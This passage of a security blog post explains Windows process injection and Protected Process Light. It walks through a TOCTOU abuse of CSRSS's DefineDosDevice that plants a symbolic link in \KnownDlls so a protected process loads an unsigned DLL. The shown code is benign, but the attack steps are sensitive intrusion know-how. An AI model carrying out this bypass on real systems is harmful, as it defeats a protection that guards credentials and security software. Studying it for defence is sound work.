<!doctype html><html lang=en itemscope itemtype=http://schema.org/WebPage><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>Process Injection: The Journey to Penetrate Windows' Protected Process Light Security Barrier - Daminha Blog</title>
<meta name=description content="A deep-dive into advanced process injection techniques, demonstrating how to bypass Windows&rsquo; Protected Process Light (PPL) security mechanism. The post covers the journey from classic DLL injection to exploiting the KnownDlls TOCTOU vulnerability in CSRSS, and finally using Shellcode Reflective DLL Injection (sRDI) to achieve code execution in a PPL process."><script type=application/ld+json>{"@context":"http://schema.org","@type":"WebSite","name":"Daminha Blog","url":"https:\/\/dangduongminhnhat.github.io\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Organization","name":"","url":"https:\/\/dangduongminhnhat.github.io\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/dangduongminhnhat.github.io\/","name":"home"}},{"@type":"ListItem","position":3,"item":{"@id":"https:\/\/dangduongminhnhat.github.io\/posts\/d090725\/process-injection\/","name":"Process injection the journey to penetrate windows\u0027 protected process light security barrier"}}]}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Article","author":{"name":"Dang Duong Minh Nhat"},"headline":"Process Injection: The Journey to Penetrate Windows\u0027 Protected Process Light Security Barrier","description":"A deep-dive into advanced process injection techniques, demonstrating how to bypass Windows\u0026rsquo; Protected Process Light (PPL) security mechanism. The post covers the journey from classic DLL injection to exploiting the KnownDlls TOCTOU vulnerability in CSRSS, and finally using Shellcode Reflective DLL Injection (sRDI) to achieve code execution in a PPL process.","inLanguage":"en","wordCount":5351,"datePublished":"2025-07-09T16:10:43\u002b07:00","dateModified":"2025-07-09T16:10:43\u002b07:00","image":"https:\/\/dangduongminhnhat.github.io\/","keywords":["Process Injection, PPL, Red Team, Windows Internals, DLL Injection, CyberSecurity"],"mainEntityOfPage":"https:\/\/dangduongminhnhat.github.io\/posts\/d090725\/process-injection\/","publisher":{"@type":"Organization","name":"https:\/\/dangduongminhnhat.github.io\/","logo":{"@type":"ImageObject","url":"https:\/\/dangduongminhnhat.github.io\/","height":60,"width":60}}}</script><meta property="og:title" content="Process Injection: The Journey to Penetrate Windows' Protected Process Light Security Barrier"><meta property="og:description" content="A deep-dive into advanced process injection techniques, demonstrating how to bypass Windows&rsquo; Protected Process Light (PPL) security mechanism. The post covers the journey from classic DLL injection to exploiting the KnownDlls TOCTOU vulnerability in CSRSS, and finally using Shellcode Reflective DLL Injection (sRDI) to achieve code execution in a PPL process."><meta property="og:url" content="https://dangduongminhnhat.github.io/posts/d090725/process-injection/"><meta property="og:type" content="website"><meta property="og:site_name" content="Daminha Blog"><meta name=twitter:title content="Process Injection: The Journey to Penetrate Windows' Protected Process …"><meta name=twitter:description content="A deep-dive into advanced process injection techniques, demonstrating how to bypass Windows&rsquo; Protected Process Light (PPL) security mechanism. The post covers the journey from classic DLL …"><meta name=twitter:card content="summary_large_image"><meta name=generator content="Hugo 0.129.0"><link rel=alternate href=https://dangduongminhnhat.github.io/index.xml type=application/rss+xml title="Daminha Blog"><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.css integrity=sha384-3UiQGuEI4TTMaFmGIZumfRPtfKQ3trwQE2JgosJxCnGmQpL/lJdjpcHkaaFwHlcI crossorigin=anonymous><link rel=stylesheet href=https://use.fontawesome.com/releases/v5.5.0/css/all.css integrity=sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/css/bootstrap.min.css integrity=sha384-HSMxcRTRxnN+Bdg0JdbxYKrThecOKuH5zCYotlSAcp1+c8xmyTe9GYg1l9a69psu crossorigin=anonymous><link rel=stylesheet href=https://dangduongminhnhat.github.io/css/main.css><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic"><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800"><link rel=stylesheet href=https://dangduongminhnhat.github.io/css/syntax.css><link rel=stylesheet href=https://dangduongminhnhat.github.io/css/codeblock.css><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css integrity=sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh crossorigin=anonymous><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css integrity=sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R crossorigin=anonymous><link rel=stylesheet href=https://dangduongminhnhat.github.io/css/theme-toggle.css><script>const savedTheme=localStorage.getItem("theme")||"light";document.documentElement.setAttribute("data-theme",savedTheme)</script><script async src="https://www.googletagmanager.com/gtag/js?id=G-V19WW5WSEZ"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-V19WW5WSEZ")}</script><link rel=apple-touch-icon sizes=180x180 href=/favicon_io/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon_io/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon_io/favicon-16x16.png><link rel=manifest href=/favicon_io/site.webmanifest><script type=text/x-mathjax-config>
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [['$', '$'], ['\\(', '\\)']],
      processEscapes: true
    }
  });
</script><script type=text/javascript async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS_HTML-full"></script><script type=text/javascript async src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><meta name=google-site-verification content="ors8seNeA2TL4hvELynbBtrr4PwXapoPh2td6zTadCU"><meta name=google-site-verification content="oQJmyNtEP9HjjEcXwRno2_YPeuLd5kX3jTltynIx65s"></head><body><nav class="navbar navbar-default navbar-fixed-top navbar-custom"><div class=container-fluid><div class=navbar-header><button type=button class=navbar-toggle data-toggle=collapse data-target=#main-navbar>
<span class=sr-only>Toggle navigation</span>
<span class=icon-bar></span>
<span class=icon-bar></span>
<span class=icon-bar></span>
</button>
<a class=navbar-brand href=https://dangduongminhnhat.github.io/>Daminha Blog</a></div><div class="collapse navbar-collapse" id=main-navbar><ul class="nav navbar-nav navbar-right"><li><a title=About href=/posts/about-me/>About</a></li><li><a title=Tags href=/tags/>Tags</a></li><li><a title="Cryptography Series" href=/posts/cryptography/>Cryptography Series</a></li><li><a title=Note href=https://hackmd.io/@daminha>Note</a></li><li><a title=Blog href=/posts/blog/>Blog</a></li><li><a href=javascript:void(0); onclick=toggleTheme() style=outline:none><span class="hidden-sm hidden-md hidden-lg">Theme</span>
<span class="glyphicon glyphicon-adjust" id=themeGlyph></span></a></li></ul></div></div></nav><script>document.addEventListener("DOMContentLoaded",function(){const e=localStorage.getItem("theme")||"light";document.documentElement.setAttribute("data-theme",e),window.toggleTheme=function(){const t=document.documentElement.getAttribute("data-theme"),e=t==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",e),localStorage.setItem("theme",e)}})</script><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><header class=header-section><div class="intro-header no-img"><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><div class=posts-heading><h1>Process Injection: The Journey to Penetrate Windows' Protected Process Light Security Barrier</h1><hr class=small></div></div></div></div></div><div class=container role=main><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><article role=main class=blog-post><p><strong>Posted on:</strong> July 9, 2025 |
<strong>Reading time:</strong> 26 minutes |
<strong>Word count:</strong> 5351 words |
<strong>Author:</strong> Dang Duong Minh Nhat</p><p>Hello everyone, today I’m sharing another red team technique—process injection—and how to leverage it against Protected Process Light (PPL). Let’s explore it in the blog post below.</p><h2 id=table-of-contents>Table of Contents</h2><ul><li><a href=#table-of-contents>Table of Contents</a></li><li><a href=#dll-injection>DLL INJECTION</a></li><li><a href=#loading-this-dll-into-the-protected-process-light>Loading this DLL into the protected process light.</a></li><li><a href=#references>References</a></li><li><a href=#connect-with-me>Connect with Me</a></li></ul><h2 id=dll-injection>DLL INJECTION</h2><p>A <strong>DLL (Dynamic-Link Library)</strong> is a library that allows applications to link to and use its functionalities. It is essentially a collection of functions and data that can be utilized by multiple applications simultaneously. Once written and compiled into a DLL, a function can be reused in any application in the form of its machine code, regardless of the original source code language. When a process calls a function in a DLL, the operating system loads the DLL into memory and jumps to the corresponding function.</p><p>The <code>DllMain</code> function is an optional entry point that Windows automatically calls when a process or thread is initialized or terminated, or when the DLL is loaded or unloaded (via <code>LoadLibrary</code> or <code>FreeLibrary</code>). In this task, we use <code>DllMain</code> to invoke <code>OutputDebugStringA</code> with the string <code>"TEST DBG"</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;windows.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>// Minimal DllMain example calling OutputDebugString
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>BOOL WINAPI <span style=color:#a6e22e>DllMain</span>(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>switch</span> (fdwReason)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>case</span> DLL_PROCESS_ATTACH:
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>OutputDebugStringA</span>(<span style=color:#e6db74>&#34;TEST DBG&#34;</span>);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>case</span> DLL_THREAD_ATTACH:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>case</span> DLL_THREAD_DETACH:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>case</span> DLL_PROCESS_DETACH:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> TRUE;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>A <strong>process</strong> is a sequence of instructions executed by the system. In simpler terms, any program being executed and utilizing system resources such as CPU and memory is considered a process.</p><p><strong>Process Injection</strong> is a technique used to inject malicious code into the memory space of another running process. In this technique, the attacker forces the target process to execute arbitrary code by writing their own code into the address space of that process. The injected code runs within the context and privileges of the vulnerable process, thus inheriting its access rights and trust level on the system. In our case, the injected code is a DLL. The process injection steps are as follows:</p><ol><li>Identify the target process to inject the malicious DLL into, using APIs to enumerate running processes.</li><li>Once identified, use the <code>OpenProcess</code> API to obtain a handle to the target process. This handle enables operations such as memory reading/writing and process information queries.</li><li>Allocate memory in the target process&rsquo;s virtual address space using API <code>VirtualAllocEx</code>.</li><li>Use <code>WriteProcessMemory</code> to write the path to the malicious DLL into the allocated memory, then use <code>LoadLibraryA</code> from <code>kernel32.dll</code> to load the DLL at runtime.</li><li>Execute the injected DLL by creating a new thread in the remote process via <code>CreateRemoteThread</code>.</li></ol><p>The result shown in the figure below confirms that the DLL has been successfully injected into the running <code>notepad.exe</code> process with PID 11704, and the output was captured in the DebugView window.</p><p><img src=/images/d070925/Injection.png alt=Line>
<em>Result of DLL Injection.</em></p><hr><h2 id=loading-this-dll-into-the-protected-process-light>Loading this DLL into the protected process light.</h2><p>To begin, we must first understand the concept of <strong>Protected Processes</strong>. Introduced in Windows Vista / Server 2008, the primary goal of protected processes was not to safeguard user data or login credentials, but rather to protect the digital content stream and enforce Digital Rights Management (DRM) policies. Only certain DLLs provided by Windows itself are allowed to be loaded into a protected process. For an executable to be accepted as a &ldquo;protected&rdquo; process by the operating system, it must be signed with a special certificate issued by Microsoft, and this certificate must be embedded directly into the executable.</p><p>In practice, a <strong>Protected Process (PP)</strong> can only be accessed by non-protected processes with very limited privileges, including: <code>PROCESS_QUERY_LIMITED_INFORMATION</code>, <code>PROCESS_SET_LIMITED_INFORMATION</code>, <code>PROCESS_TERMINATE</code>, and <code>PROCESS_SUSPEND_RESUME</code>. For highly sensitive processes, this set of permissions can be further restricted.</p><p>Several years later, starting with Windows 8.1 / Server 2012 R2, Microsoft introduced an extension to this concept known as <strong>Protected Process Light (PPL)</strong>. PPL builds on the existing Protected Process model and introduces the concept of <strong>protection levels</strong>, meaning that some protected processes can be guarded more strictly than others. The protection level of a process is stored in the <code>Protection</code> field of the kernel structure <code>EPROCESS</code>, which is defined using the following structure:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>// PS_PROTECTION structure
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>struct</span> _PS_PROTECTION {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>union</span> {
</span></span><span style=display:flex><span>        UCHAR Level;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>struct</span> {
</span></span><span style=display:flex><span>            UCHAR Type   : <span style=color:#ae81ff>3</span>;   <span style=color:#75715e>// Protection type: None, ProtectedLight, Protected
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            UCHAR Audit  : <span style=color:#ae81ff>1</span>;   <span style=color:#75715e>// Reserved (not used)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            UCHAR Signer : <span style=color:#ae81ff>4</span>;   <span style=color:#75715e>// Signer type
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        };
</span></span><span style=display:flex><span>    };
</span></span><span style=display:flex><span>} PS_PROTECTION, <span style=color:#f92672>*</span>PPS_PROTECTION;
</span></span></code></pre></div><p>Although this is a structure, all the data is stored in a single byte (<code>UCHAR</code>), in which:</p><ul><li><p>The first 3 bits represent the <code>Type</code> (protection type):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>enum</span> _PS_PROTECTED_TYPE {
</span></span><span style=display:flex><span>    PsProtectedTypeNone <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>    PsProtectedTypeProtectedLight <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>,
</span></span><span style=display:flex><span>    PsProtectedTypeProtected <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>} PS_PROTECTED_TYPE;
</span></span></code></pre></div></li><li><p>The last 4 bits represent the <code>Signer</code> &mdash; which determines the level of trust associated with the process:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>enum</span> _PS_PROTECTED_SIGNER {
</span></span><span style=display:flex><span>    PsProtectedSignerNone <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>,         <span style=color:#75715e>// 0
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    PsProtectedSignerAuthenticode,     <span style=color:#75715e>// 1
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    PsProtectedSignerCodeGen,          <span style=color:#75715e>// 2
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    PsProtectedSignerAntimalware,      <span style=color:#75715e>// 3
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    PsProtectedSignerLsa,              <span style=color:#75715e>// 4
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    PsProtectedSignerWindows,          <span style=color:#75715e>// 5
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    PsProtectedSignerWinTcb,           <span style=color:#75715e>// 6
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    PsProtectedSignerWinSystem,        <span style=color:#75715e>// 7
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    PsProtectedSignerApp,              <span style=color:#75715e>// 8
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    PsProtectedSignerMax               <span style=color:#75715e>// 9
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>} PS_PROTECTED_SIGNER;
</span></span></code></pre></div></li></ul><table><thead><tr><th style=text-align:left><strong>Value</strong></th><th style=text-align:left><strong>Signer</strong></th><th style=text-align:left><strong>Type</strong></th></tr></thead><tbody><tr><td style=text-align:left>0x72</td><td style=text-align:left>WinSystem (7)</td><td style=text-align:left>Protected (2)</td></tr><tr><td style=text-align:left>0x62</td><td style=text-align:left>WinTcb (6)</td><td style=text-align:left>Protected (2)</td></tr><tr><td style=text-align:left>0x52</td><td style=text-align:left>Windows (5)</td><td style=text-align:left>Protected (2)</td></tr><tr><td style=text-align:left>0x12</td><td style=text-align:left>Authenticode (1)</td><td style=text-align:left>Protected (2)</td></tr><tr><td style=text-align:left>0x61</td><td style=text-align:left>WinTcb (6)</td><td style=text-align:left>Protected Light (1)</td></tr><tr><td style=text-align:left>0x51</td><td style=text-align:left>Windows (5)</td><td style=text-align:left>Protected Light (1)</td></tr><tr><td style=text-align:left>0x41</td><td style=text-align:left>Lsa (4)</td><td style=text-align:left>Protected Light (1)</td></tr><tr><td style=text-align:left>0x31</td><td style=text-align:left>Antimalware (3)</td><td style=text-align:left>Protected Light (1)</td></tr><tr><td style=text-align:left>0x11</td><td style=text-align:left>Authenticode (1)</td><td style=text-align:left>Protected Light (1)</td></tr></tbody></table><p><em>Common Protection Levels of PP/PPL</em></p><p>Initially, protected processes had only a binary state: protected or not. However, since Windows 8.1 (Windows NT 6.3), each PP/PPL process can have its own protection level, determined by a &ldquo;signer level&rdquo;. This level is usually derived from a special field in the digital certificate of the executable, specifically the <code>Enhanced Key Usage (EKU)</code> field.</p><p>The <strong>Protected Process / Protected Process Light (PP/PPL)</strong> model was designed to prevent unprotected processes from accessing protected ones with elevated privileges &mdash; for example, via the <code>OpenProcess</code> API. This makes it difficult to access or manipulate memory in protected processes. However, another crucial security aspect of this model is that protected processes are also prevented from loading <em>unsigned</em> (i.e., untrusted) DLLs.</p><p>It is important to understand the DLL search order in Windows. When a process is created, the system attempts to locate required DLLs in the following order:</p><ol><li>Known DLLs</li><li>The application&rsquo;s directory</li><li>System directories (e.g., <code>System32</code>)</li><li>Other search paths (environment variables, registry, etc.)</li></ol><p>Although the <strong>Known DLLs</strong> mechanism is typically ignored in most DLL hijacking scenarios (since regular users have no control over it), it becomes highly relevant in the context of PPL exploitation.</p><p><strong>Known DLLs</strong> are a set of commonly used DLLs that are preloaded and cached by the Windows operating system for performance reasons. When a protected process (PP) is launched, one of its strict requirements is that all loaded DLLs must be read from disk and must have a valid digital signature. This means any attempt to inject or load an unsigned DLL will fail.</p><p>However, in the case of a <strong>PPL (Protected Process Light)</strong>, the restrictions are slightly relaxed. PPL processes are still protected but can load pre-cached DLLs from memory &mdash; just like standard processes. If a DLL is already present in the system’s DLL cache and has previously been marked as trusted, a PPL process can load it <em>without triggering signature verification again</em>. This opens a potential attack surface.</p><p>If an attacker can spoof an entry in the <code>\KnownDlls</code> directory, then when the target PPL process starts and attempts to load a specific DLL, the system will load the attacker’s fake DLL from memory instead of the legitimate version from disk. Since the DLL is being loaded from the trusted cache, the system will not enforce code signing verification. This allows an <em>unsigned malicious DLL</em> to run inside a PPL process &mdash; something that should not be possible under normal circumstances.</p><p>Microsoft has implemented strict protections to prevent unauthorized modification of the <code>\KnownDlls</code> object directory. This directory is protected by the <strong>Process Trust Label (PTL)</strong> system. Only processes with a very high protection level (e.g., <code>WinTcb</code> or higher) are allowed to write or create entries in <code>\KnownDlls</code>.</p><p>Even most PPL processes, such as those signed with the <code>Antimalware</code> signer level, do not have the necessary privileges to write to this directory. This significantly limits the ability of attackers to exploit this vector unless they already control a highly privileged process.</p><p>In Windows, there exists a subsystem known as the <strong>Object Manager</strong>, which is responsible for managing all system-wide objects. Drive letters such as <code>C:</code>, <code>E:</code>, etc., are not actual hardware devices. Instead, they are symbolic identifiers known as <strong>MS-DOS Device Names</strong>, which are mapped to real device objects within the system.</p><p>For example, the drive letter <code>C:</code> is typically mapped to a device object like <code>\Device\HarddiskVolume3</code>. This mapping is maintained by the Object Manager and allows legacy MS-DOS-style path referencing to work with the underlying NT object namespace. An illustration of such a mapping can be seen in the figure below.</p><p><img src=/images/d070925/dosdevice.png alt=Line>
<em>MS-DOS-style path.</em></p><p>These symbolic identifiers are stored within the Object Manager under a special directory called <code>\DosDevices</code>. For example, the mapping <code>\DosDevices\C:</code> → <code>\Device\HarddiskVolume3</code>. Finally, it is important to note that <code>\DosDevices</code> is merely an alias for <code>\??</code>. In other words, they refer to the same object directory within the Windows Object Manager namespace.</p><p>The path prefix <code>\??\</code> in Windows has a very special meaning. In reality, <code>\??\</code> represents the <em>local DOS device directory</em> of the current user. This means that the same path, such as <code>\??\E:</code>, may resolve to different locations in the Object Manager depending on the user context. Specifically, <code>\??\</code> is actually a symbolic link that points to the real path <code>\Sessions\0\DosDevices\00000000-XXXXXXXX</code>, where <code>XXXXXXXX</code> is the Authentication ID of the currently logged-in user. As shown in the figure below, an example ID is <code>00028e56</code>.</p><p>If the context is <code>NT AUTHORITY\SYSTEM</code> (the highest privileged account in Windows), then <code>\??\</code> does not resolve to a user-specific folder but instead points to <code>\GLOBAL??\</code>. This behavior is crucial to understanding how <code>DefineDosDevice</code> works, as well as exploitation techniques such as KnownDlls hijacking, because the location of a symbolic link like <code>\??\E:</code> depends on which user created it.</p><p><img src=/images/d070925/authid.png alt=Line>
<em>Authentication ID of the currently logged-in user.</em></p><p>The device mapping operation is essentially the creation of a symbolic link inside the caller&rsquo;s DOS device directory. Any user can perform this operation, as it only affects their current session. However, there is a limitation: low-privileged users can only create temporary kernel objects. These temporary objects are automatically deleted when all of their handles are closed, making it impossible to persistently manipulate critical namespaces like <code>\KnownDlls</code>.</p><p>To make a kernel object permanent, it must be explicitly marked with the <code>Permanent</code> attribute. However, setting this attribute requires the special privilege <code>SeCreatePermanentPrivilege</code>, which is not available to normal users. Therefore, this action must be carried out by a privileged service, specifically a system service capable of marking objects as permanent. To understand how this can be exploited, we look at the <code>DefineDosDevice</code> function:</p><pre tabindex=0><code>BOOL DefineDosDeviceW(
  DWORD   dwFlags,           // Control flags
  LPCWSTR lpDeviceName,      // Name of the device to define
  LPCWSTR lpTargetPath       // Real path the device points to
);
</code></pre><p>The purpose of <code>DefineDosDevice</code> is to define MS-DOS-style device names. Internally, it is just a wrapper for an RPC call to a system service. This RPC call is handled by the CSRSS service and implemented by the function <code>BaseSrvDefineDosDevice</code> in the <code>BASESRV.DLL</code> library.</p><p>What makes this interesting is that CSRSS runs as a <em>Protected Process Light (PPL)</em> with the highest protection level of <code>WinTcb</code> (as shown in the figure below). More importantly, the <code>lpDeviceName</code> parameter in the <code>DefineDosDevice</code> function is not sanitized. This means that we are not restricted to providing only drive letters like <code>"E:"</code>; instead, we can exploit this behavior to trick CSRSS into creating arbitrary symbolic links at arbitrary locations—such as within <code>\KnownDlls</code>.</p><p><img src=/images/d070925/csrss.png alt=Line>
<em>CSRSS service.</em></p><p>Now, let us examine how the <code>DefineDosDevice</code> function works internally within the CSRSS service (specifically through the <code>BaseSrvDefineDosDevice</code> function), to better understand its weakness. When <code>DefineDosDeviceW()</code> is invoked, CSRSS begins by impersonating the RPC caller (i.e., the user who called <code>DefineDosDevice</code>), allowing it to manipulate symbolic links as if the user were performing the operation directly.</p><p>Next, CSRSS attempts to open <code>\??\DEVICE_NAME</code> to check whether the symbolic link already exists. If it fails to open the link, it proceeds directly to the creation step. If the link exists, CSRSS checks whether it is a global symbolic link. To determine this, CSRSS retrieves the real target path of the link; if the path begins with <code>\GLOBAL??\</code>, it is considered &ldquo;global.&rdquo; In such cases, CSRSS disables impersonation because the creation of global symbolic links must be performed under its own SYSTEM context—not the user&rsquo;s.</p><p>If the symbolic link is not global and already exists, CSRSS deletes it. Then, depending on whether the creation requires user-level permissions, CSRSS either re-enables impersonation or proceeds under its own context.</p><p>At this stage, CSRSS calls the native API <code>NtCreateSymbolicLinkObject</code> to create the link <code>\??\DEVICE_NAME → TARGET_PATH</code>. If the service is impersonating the user, the symbolic link will belong to that user; otherwise, it will be owned by CSRSS itself, i.e., under SYSTEM privileges.</p><p>After creating the link, CSRSS reverts back to its original context (via <code>RevertToSelf</code>). If impersonation was active, it stops and returns to the true CSRSS identity.</p><p>Finally, the symbolic link creation is verified. If it fails, an error status is returned. If it succeeds, the link is marked as <code>Permanent</code>—meaning it will not be automatically deleted when handles are closed. The overall result (success or failure) is then returned to the original <code>DefineDosDeviceW</code> caller. These steps are illustrated clearly in the figure below.</p><p><img src=/images/d070925/DefineDosDevice-1.png alt=Line>
<em>How the <code>DefineDosDevice</code> function works. <a href=https://blog.scrt.ch/2021/04/22/bypassing-lsa-protection-in-userland/>Source Image</a></em></p><p>However, the above process has a critical vulnerability known as a TOCTOU (Time-of-Check Time-of-Use) flaw. TOCTOU refers to a situation where the state of a resource changes between the time it is checked and the time it is used. We will exploit this vulnerability, along with the fact that the function switches between user and SYSTEM context, to create a symbolic link under the protected <code>\KnownDlls</code> namespace. The exploitation process consists of three key actions, as described below.</p><p><strong>ACTION 1.</strong> With SYSTEM privileges (since only SYSTEM can write to <code>\GLOBAL??\</code>), we call <code>CreateDirectory</code> to create the directory <code>\GLOBAL??</code> <code>\KnownDlls</code>. Then, we call <code>CreateSymbolicLink</code> to create a symbolic link named <code>FOO.dll</code> inside this directory. As a result, a symbolic link object at <code>\GLOBAL??\KnownDlls\FOO.dll</code> is created, pointing to an arbitrary target (its actual target is irrelevant—we just need the link to exist). This setup ensures that during the &ldquo;check&rdquo; phase of <code>DefineDosDevice</code>, no <code>"object not found"</code> error is thrown when verifying the existence of <code>\GLOBAL??\KnownDlls\FOO.dll</code>.</p><p><strong>ACTION 2.</strong> We drop privileges to Administrator (user mode), and call <code>CreateSymbolicLink</code> again, this time creating a link named <code>\??\GLOBALROOT</code> that points to <code>\GLOBAL??\</code>. This symbolic link resides in the user’s local device namespace. As a result, when <code>DefineDosDevice</code> impersonates the user and encounters <code>\??\GLOBALROOT</code>, the path resolution is redirected to <code>\GLOBAL??\</code>.</p><p><strong>ACTION 3.</strong> We call <code>DefineDosDevice</code> with <code>lpDeviceName</code> set to <code>GLOBALROOT\KnownDlls\FOO.dll</code>, and <code>lpTargetPath</code> set to the path of our malicious DLL.</p><p><strong>PHASE 1.</strong> The function appends <code>\??\</code> to the beginning of the device name, resulting in <code>\??\GLOBALROOT\KnownDlls\FOO.dll</code>. Because the function is still impersonating the user, it uses the user&rsquo;s <code>\??\</code> namespace, where it finds the link <code>GLOBALROOT</code> and follows it to resolve the path as <code>\GLOBAL??\KnownDlls\FOO.dll</code>. The function then verifies that this object exists (as created in Action 1). Seeing that the resolved path starts with <code>\GLOBAL??\</code>, the function deems it a global link, and immediately disables impersonation—switching to SYSTEM context.</p><p><strong>PHASE 2.</strong> The same input path, <code>\??\GLOBALROOT\KnownDlls\FOO.dll</code>, is used again. But now, in SYSTEM context, <code>\??\</code> maps to <code>\GLOBAL??\</code>. This transforms the path into <code>\GLOBAL??\GLOBALROOT\KnownDlls\FOO.dll</code>. The function looks for <code>GLOBALROOT</code> under <code>\GLOBAL??\</code>, and finds an existing symbolic link that points to the root object directory <code>\</code>, which is the root directory of all kernel objects (as illustrated in the figure below). The final resolved path becomes <code>\KnownDlls\FOO.dll</code>.</p><p>Finally, the function calls <code>NtCreateSymbolicLinkObject</code> to create a new symbolic link at the resolved path, <code>\KnownDlls\FOO.dll</code>, pointing to our malicious DLL—thus completing a successful attack against a protected namespace.</p><p><img src=/images/d070925/11_winobj-globalroot.png alt=Line>
